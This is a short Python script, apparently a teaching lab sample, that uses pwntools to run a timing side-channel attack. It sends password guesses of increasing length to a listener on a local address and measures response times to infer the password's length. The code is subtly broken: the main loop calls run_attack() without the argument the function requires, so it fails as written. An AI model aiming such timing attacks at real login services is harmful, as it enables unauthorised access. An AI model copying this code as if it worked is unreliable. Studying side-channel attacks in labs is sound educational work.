#!/usr/bin/python3

# install python3 pwn tools with
# see https://python3-pwntools.readthedocs.io/en/latest/install.html
#
# $ apt-get update
# $ apt-get install python3 python3-dev python3-pip git
# $ pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git

from pwn import *	# pwntools
import time		# for timing, though the time.time() lib is not usually the best choice for precision timing (it will work in this case)
# import sys		

''' 
' run_attack
' no params, no return
' this sample code uses pwntwools library to connect to a remote listener
' and send a password guess. The listener port and IP are specified
' within the code below. There is a timer that times the elapsed time to
' send the password guess and receive feedback.
'''
def run_attack(x):
	remote_IP = '127.0.0.249'	# where the vulnerable program is running
	remote_port = 5516	# the vulnerable program's listening port

	guess = "2"*x	# password guess

	r = remote(remote_IP, remote_port)	# this creates the remote connection to the listener program
	val = r.recvline()			# receives the prompt
	start = time.time()			# take the current time
	r.sendline(guess + "\n")		# send the guess
	val = r.recvline()			# receive any response
	end = time.time()			# takes the current ime
	elapsed_time = end-start		# calculate elapsed time
	r.close()				# close the connection
	time.sleep(0.01)			# sleep a bit to prevent DOSing listener program

	print("Guess: " + guess + " length: " + str(len(guess)))
	print("Elapsed time: " + str(elapsed_time))


# __main__ function calls the attack code
if __name__ == "__main__":
	for x in range(5,11,1):	
		run_attack()	# runs the attack
	
